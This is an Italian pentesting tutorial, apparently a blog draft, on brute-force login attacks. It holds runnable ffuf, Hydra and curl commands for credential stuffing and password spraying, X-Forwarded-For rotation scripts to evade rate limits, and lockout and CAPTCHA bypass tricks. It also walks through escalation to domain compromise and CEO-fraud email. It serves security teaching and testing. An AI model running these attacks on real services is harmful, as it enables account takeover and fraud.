---
title: 'Brute Force Attack: Tecniche, Tool e Bypass nel Penetration Testing'
slug: brute-force
description: 'Brute Force attack nel penetration testing: password cracking, credential stuffing, wordlist, Hydra, Burp Intruder e bypass rate limit nei sistemi di autenticazione.'
image: /brute (1).webp
draft: true
date: 2026-03-05T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - owasp
tags:
  - brute-force
  - password attacks
---

# Brute Force Attack: Tecniche, Password Spraying e Credential Stuffing

Il **Brute Force Attack **è una tecnica di attacco in cui un attaccante prova molte combinazioni di username e password fino a trovare credenziali valide. Nel penetration testing viene usato per testare la sicurezza dei sistemi di autenticazione, delle API di login e dei pannelli amministrativi.
Il brute force è l'attacco più vecchio e meno sofisticato del web: prova username e password finché non entri. Nessun exploit, nessuna vulnerabilità tecnica — solo perseveranza e un buon dizionario. Sembra primitivo, eppure è la causa di una fetta enorme dei breach reali. La ragione è semplice: le persone usano password deboli, le riusano su più servizi, e le applicazioni spesso non implementano protezioni adeguate (rate limit, lockout, CAPTCHA).

Nel 2026 il brute force "puro" (provare `aaaa`, `aaab`, `aaac`...) è morto. Quello che funziona è il **credential stuffing** (email e password da breach precedenti) e il **password spraying** (una password comune contro migliaia di utenti). Con i database di breach pubblici che superano i 10 miliardi di credenziali, la probabilità che almeno un utente del tuo target abbia una password già leakata è vicina alla certezza.

Satellite della [guida pillar Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [2FA Bypass](https://hackita.it/articoli/2fa-bypass), [Password Reset Attack](https://hackita.it/articoli/password-reset-attack).

Riferimenti: [OWASP Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html), [HackTricks Brute Force](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html).

***

## Le 3 Strategie — Scegli Quella Giusta

### 1. Credential Stuffing (il più efficace)

```
HAI: un database di email:password da breach precedenti
PROVI: le stesse credenziali sul target
PERCHÉ FUNZIONA: le persone riusano le password

Esempio:
- Dal breach di LinkedIn 2016: mario.rossi@gmail.com:Summer2016!
- Prova su target.com: mario.rossi@gmail.com:Summer2016!
- Se funziona → account compromesso
```

### 2. Password Spraying (il più silenzioso)

```
HAI: una lista di username/email del target
PROVI: 1-3 password comuni per TUTTI gli utenti
PERCHÉ FUNZIONA: c'è sempre qualcuno con password debole

Esempio:
- Lista: 5.000 email aziendali (da LinkedIn, email harvesting, OSINT)
- Password: "Company2026!", "Welcome1!", "Password123!"
- 1 password × 5.000 utenti = 5.000 tentativi
- Ma per il rate limit è solo 1 tentativo per account → sotto il radar
```

### 3. Dictionary Attack (classico)

```
HAI: un username specifico (es. admin)
PROVI: un dizionario di password comuni
PERCHÉ FUNZIONA: se non c'è rate limit, provi finché funziona

Esempio:
- Username: admin@target.com
- Dizionario: rockyou.txt (14 milioni di password)
- Se non c'è lockout dopo N tentativi → questione di tempo
```

***

## Wordlist — La Differenza Tra Successo E Fallimento

### Password Comuni (sempre efficaci)

```bash
# Top 20 password più trovate nei pentest:
Password1!
Company2026!      # Nome azienda + anno + !
Welcome1!
Changeme1!
Summer2026!
Winter2025!
P@ssw0rd
Admin123!
Qwerty123!
123456789
Password123
Company123!       # Variante senza anno
Target2026!       # Nome target + anno
Milano2026!       # Città sede + anno
Italia2026!
Benvenuto1!
Accesso123!
Password1
Admin2026!
Test1234!
```

### Costruisci Wordlist Custom

```bash
# CeWL — genera wordlist dal sito del target:
cewl https://target.com -d 3 -m 5 -w custom_words.txt
# Estrae parole dal sito: nome prodotto, slogan, persone, città

# Aggiungi variazioni con regole hashcat:
# base: "company" → Company, Company1, Company!, Company2026, Company2026!

# Script per generare variazioni:
#!/bin/bash
while read word; do
  echo "${word}"
  echo "${word}1"
  echo "${word}!"
  echo "${word}123"
  echo "${word}2025"
  echo "${word}2026"
  echo "${word}2025!"
  echo "${word}2026!"
  echo "${word^}"       # Prima lettera maiuscola
  echo "${word^}1"
  echo "${word^}!"
  echo "${word^}123"
  echo "${word^}2026!"
done < custom_words.txt > target_wordlist.txt
```

### Raccogli Username/Email

```bash
# LinkedIn (la fonte principale):
# Cerca "Company Name" → People → raccogli nomi
# Converti in email: nome.cognome@company.com, n.cognome@company.com

# theHarvester:
theHarvester -d target.com -b google,linkedin,bing -l 500

# hunter.io:
# https://hunter.io/domain-search → email pattern + indirizzi noti

# Google Dorks:
site:linkedin.com "target company" "@target.com"
"@target.com" filetype:pdf
"@target.com" filetype:xlsx
```

***

## Tool — Login Brute Force

### ffuf (il più veloce)

```bash
# === Login POST form ===
ffuf -u "https://target.com/login" \
  -X POST \
  -d "username=admin@target.com&password=FUZZ" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -w /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
  -mc 302 \
  -mr "dashboard|welcome" \
  -t 50

# === API JSON ===
ffuf -u "https://target.com/api/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@target.com","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -mc 200 \
  -mr "token" \
  -t 50

# === Credential Stuffing (email:password pairs) ===
# File: creds.txt con formato email:password (una per riga)
ffuf -u "https://target.com/api/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZUSER","password":"FUZZPASS"}' \
  -w creds.txt:FUZZUSER:FUZZPASS \
  -mode pitchfork \
  -mc 200 \
  -mr "token"

# === Password Spraying ===
ffuf -u "https://target.com/api/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ","password":"Company2026!"}' \
  -w emails.txt \
  -mc 200 \
  -mr "token" \
  -rate 10  # Lento per evitare lockout
```

Leggi la guida del tool [qui](https://hackita.it/articoli/ffuf).

### Hydra

```bash
# HTTP POST form:
hydra -l admin@target.com -P /usr/share/wordlists/rockyou.txt \
  target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=Invalid credentials" \
  -t 16 -V

# HTTP Basic Auth:
hydra -l admin -P passwords.txt target.com http-get /admin/ -t 16

# SSH:
hydra -l root -P passwords.txt target.com ssh -t 4
```

Anche qui c'è l'abbiamo,non ti facciamo mancare nulla. Vedi [qui](https://hackita.it/articoli/hydra) comandi segreti.

### Burp Intruder

```
Per credential stuffing (Cluster Bomb):
1. Intercetta il login in Burp
2. "Send to Intruder"
3. Seleziona username e password → "Add §"
4. Attack type: "Pitchfork" (email e password dalla stessa riga)
5. Payload 1: lista email
6. Payload 2: lista password (corrispondenti)
7. Filtra per status code o keyword nella response

Per password spraying (Sniper):
1. Username = §FUZZ§, password = "Company2026!" (fisso)
2. Payload: lista email
3. Un solo tentativo per utente → sotto il radar del lockout
```

***

Dai ,vi vogliamo bene.Vi facciamo anche questo regalo [qui](https://hackita.it/articoli/burp-suite/).

## Rate Limit Bypass — Quando C'è Ma Non Basta

### Header Rotation

```bash
# Il rate limit è basato sull'IP → cambia l'IP percepito:
X-Forwarded-For: 10.0.0.1
X-Forwarded-For: 10.0.0.2
X-Forwarded-For: 10.0.0.3
...

# Script con IP rotation:
for i in $(seq 1 1000); do
  ip="10.0.$((RANDOM % 255)).$((RANDOM % 255))"
  curl -s -X POST "https://target.com/api/login" \
    -H "X-Forwarded-For: $ip" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"admin@target.com\",\"password\":\"$(sed -n "${i}p" passwords.txt)\"}"
done

# Varianti dell'header:
X-Forwarded-For: RANDOM_IP
X-Real-IP: RANDOM_IP
X-Originating-IP: RANDOM_IP
True-Client-IP: RANDOM_IP
X-Client-IP: RANDOM_IP
CF-Connecting-IP: RANDOM_IP  # Cloudflare
```

### Account Lockout Bypass

```bash
# Se l'account si blocca dopo 5 tentativi → password spraying:
# 1 password × 5.000 utenti = mai più di 1 tentativo per account

# Oppure: lockout reset timing
# L'account si blocca per 30 minuti dopo 5 tentativi
# → Fai 4 tentativi → aspetta 30 min → altri 4 tentativi
# In 24 ore: 4 × 48 = 192 password testate per account

# Lockout su username ma non su IP?
# Cambia username dopo ogni blocco → il rate limit è per username
# → Attacca utenti diversi in parallelo

# Wildcard o case variation:
Admin@target.com → ADMIN@target.com → admin@Target.com
# Stesso account ma il rate limit li tratta come utenti diversi?
```

### CAPTCHA Bypass

```bash
# CAPTCHA solo dopo N tentativi falliti?
# → I primi N tentativi sono liberi

# CAPTCHA token riutilizzabile?
# Risolvi il CAPTCHA una volta → cattura il token → riusalo
# Se il token non è monouso → bypass

# CAPTCHA nella pagina ma non nell'API?
# Il form web ha il CAPTCHA → l'API /api/login no
# → Attacca l'API direttamente

# CAPTCHA con soluzione prevedibile?
# reCAPTCHA v2 con score basso → risolvi con servizi di solving
# (solo per assessment autorizzato)
```

### Endpoint Variation

```bash
# Il rate limit è su /login → ma cosa succede con:
/api/v1/login          # Versione vecchia
/api/v2/auth/login     # Versione nuova
/mobile/login          # Endpoint mobile
/oauth/token           # OAuth token endpoint
/admin/login           # Admin login separato

# Spesso endpoint diversi hanno rate limit diversi (o nessuno)
```

***

## Output Reale — Credential Stuffing

### Password Spray Riuscito

```bash
$ ffuf -u "https://target.com/api/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ","password":"Company2026!"}' \
  -w employees_5000.txt \
  -mc 200 \
  -mr "token" \
  -rate 5

[Status: 200, Size: 342, Words: 1, Lines: 1] → marco.verdi@company.com
[Status: 200, Size: 342, Words: 1, Lines: 1] → giulia.neri@company.com
[Status: 200, Size: 342, Words: 1, Lines: 1] → admin@company.com

# 3 account su 5.000 con password "Company2026!"
# Incluso admin! → full access
```

### Rate Limit Bypass Con Header Rotation

```bash
$ # Senza X-Forwarded-For → bloccato dopo 10 tentativi:
$ curl -X POST "https://target.com/api/login" -d '{"email":"admin","password":"test"}'
{"error": "Too many requests. Try again in 15 minutes."}

$ # Con X-Forwarded-For → nessun blocco:
$ curl -X POST "https://target.com/api/login" \
  -H "X-Forwarded-For: 192.168.1.42" \
  -d '{"email":"admin","password":"test"}'
{"error": "Invalid credentials"}
# Funziona! Il rate limit usa X-Forwarded-For come IP sorgente

$ # Brute force con IP rotation:
$ for i in $(seq 1 100); do
    curl -s -X POST "https://target.com/api/login" \
      -H "X-Forwarded-For: 10.0.$((RANDOM%255)).$((RANDOM%255))" \
      -d "{\"email\":\"admin@company.com\",\"password\":\"$(sed -n "${i}p" top100.txt)\"}" \
      | grep -q "token" && echo "[+] FOUND: $(sed -n "${i}p" top100.txt)"
  done

[+] FOUND: Admin2026!
```

***

## Workflow Reale — Brute Force Pentest

### Step 1 → Analizza il meccanismo di login

```bash
# Qual è l'endpoint? (form POST, API JSON, Basic Auth)
# Cosa restituisce su login riuscito? (redirect, token, cookie)
# Cosa restituisce su login fallito? (messaggio, status code)
# Il messaggio distingue "utente non esiste" da "password sbagliata"?
#   Se sì → username enumeration → raccogli username validi
```

### Step 2 → Testa il rate limit

```bash
# Fai 20 login falliti rapidi → cosa succede?
# Nessun blocco? → brute force libero
# Blocco dopo N? → nota N e il tempo di cooldown
# CAPTCHA dopo N? → nota N, verifica se API ha lo stesso CAPTCHA
```

### Step 3 → Testa bypass rate limit

```bash
# X-Forwarded-For rotation → il rate limit si resetta?
# Endpoint diverso (/api/v1/login vs /api/v2/login) → rate limit diverso?
# Case variation nell'email → trattato come account diverso?
```

### Step 4 → Scegli la strategia

```bash
# Hai lista email + password da breach? → Credential Stuffing
# Hai lista email ma no password? → Password Spraying
# Hai un target specifico (admin)? → Dictionary Attack
```

### Step 5 → Esegui con il tool giusto

```bash
# ffuf per velocità pura
# Hydra per protocolli diversi (SSH, FTP, HTTP)
# Burp Intruder per analisi dettagliata della response
```

### Step 6 → Post-exploitation

```bash
# Account compromesso → cosa puoi fare?
# User normale → dati personali, IDOR, escalation
# Admin → pannello completo, export, configurazione
# Service account → API, infrastruttura
```

***

## Enterprise Escalation

### Credential Stuffing → Admin → Full Compromise

```
theHarvester → 5.000 email aziendali
dehashed.com → 200 email con password da breach
Credential stuffing su VPN/OWA → 15 account funzionanti
→ 1 account è IT admin → VPN access → rete interna
→ BloodHound → path a Domain Admin
→ DOMAIN COMPROMISE da un login rubato
```

### Password Spray → O365 → Email → BEC

```
LinkedIn → 500 dipendenti del target
Pattern email: n.cognome@company.com
Password spray: "Company2026!" su login.microsoftonline.com
→ 8 account compromessi
→ CFO account → email access
→ "Bonificate urgentemente 100.000€" (firmato CFO)
→ BUSINESS EMAIL COMPROMISE
```

***

## Caso Studio Concreto

**Settore:** Azienda manifatturiera, 2.000 dipendenti, webmail OWA + VPN Fortinet.
**Scope:** Red team engagement.

LinkedIn scraping: 1.800 nomi di dipendenti → convertiti in email con pattern `n.cognome@azienda.it`. CeWL sul sito aziendale: nomi di prodotti, slogan, città della sede. Wordlist custom: `Prodotto2026!`, `Azienda2025!`, `Milano2026!`, `Welcome1!`.

Password spray su OWA (Outlook Web Access): 3 password per 1.800 email, con 1 tentativo ogni 35 minuti (sotto la soglia di lockout AD di 5 tentativi in 30 minuti). Risultato: **23 account** con password debole, di cui 2 del reparto IT.

Con l'account IT: accesso VPN → rete interna → Active Directory enumeration → il server SQL aveva credenziali domain admin nel config → DCSync → hash di tutti i 2.000 utenti AD.

**L'intero compromesso aziendale è partito da `Welcome1!` usato come password da un tecnico IT.**

***

## Errori Comuni (Lato Difesa)

**"Abbiamo il lockout dopo 5 tentativi"** — Protegge dal dictionary attack su un singolo utente. Non protegge dal password spraying (1 tentativo per utente × 5.000 utenti).

**"Il rate limit è basato sull'IP"** — Se il server legge `X-Forwarded-For` senza validazione, l'attaccante cambia IP a ogni request.

**"Abbiamo il CAPTCHA"** — Sul form web? E sull'API? Spesso il CAPTCHA è solo nel frontend, l'endpoint API è libero.

**"Le nostre password sono complesse: minimo 8 caratteri con maiuscola e numero"** — `Password1` soddisfa tutti questi requisiti. La complessità non è sicurezza — la lunghezza e l'unicità lo sono.

***

## ✅ Checklist Brute Force

```
RECONNAISSANCE
☐ Username/email raccolti (LinkedIn, theHarvester, hunter.io)
☐ Pattern email identificato (n.cognome@, nome.cognome@)
☐ Wordlist custom creata (CeWL + variazioni)
☐ Breach data verificati (se autorizzato nel scope)

RATE LIMIT
☐ Quanti tentativi prima del blocco?
☐ Tipo di blocco (temporaneo, permanente, CAPTCHA)
☐ X-Forwarded-For bypass testato
☐ Endpoint alternativi testati (/api/v1/, /mobile/)
☐ CAPTCHA solo su form o anche su API?
☐ Case variation nell'email → account diverso per il rate limit?

ATTACK
☐ Password spraying con top 3-5 password eseguito
☐ Credential stuffing con breach data eseguito (se in scope)
☐ Dictionary attack su account specifici (admin) eseguito
☐ Timing tra tentativi calibrato (sotto soglia lockout)

USERNAME ENUMERATION
☐ Il messaggio di errore distingue "utente non esiste" da "password sbagliata"?
☐ Il tempo di risposta è diverso per utenti validi vs invalidi?
☐ La registrazione rivela se l'email è già in uso?
☐ Il password reset rivela se l'email esiste?

POST-EXPLOITATION
☐ Account compromessi documentati (con ruolo)
☐ Accesso testato (web, VPN, email, API)
☐ Escalation possibile (admin, IT, service account)?
```

***

Riferimenti: [OWASP Credential Stuffing Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html), [OWASP Brute Force Testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Brute_Force), [HackTricks Brute Force](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/brute-force.html), [SecLists Password Lists](https://github.com/danielmiessler/SecLists/tree/master/Passwords).

Leggi la [Guida Auth & Access Control](https://hackita.it/articoli/auth-access-control-guida-completa). Vedi anche: [2FA Bypass](https://hackita.it/articoli/2fa-bypass), [Password Reset Attack](https://hackita.it/articoli/password-reset-attack), [Privilege Escalation Web](https://hackita.it/articoli/privilege-escalation-web).

> Il rate limit blocca `X-Forwarded-For` rotation? Il CAPTCHA protegge anche l'API? Il password spray con `Company2026!` trova account? Approfondisci anche [2FA Bypass](https://hackita.it/articoli/2fa-bypass) e [Password Reset Attack](https://hackita.it/articoli/password-reset-attack). Per testare la sicurezza del login della tua applicazione o azienda puoi richiedere un [penetration test HackIta](https://hackita.it/servizi). Per imparare tecniche reali di password spraying, credential stuffing e brute force testing è disponibile anche la formazione 1:1. Riferimenti: [https://owasp.org/www-project-web-security-testing-guide/latest/4-Web\_Application\_Security\_Testing/04-Authentication\_Testing/04-Testing\_for\_Brute\_Force](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/04-Testing_for_Brute_Force) — [https://cheatsheetseries.owasp.org/cheatsheets/Credential\_Stuffing\_Prevention\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html)
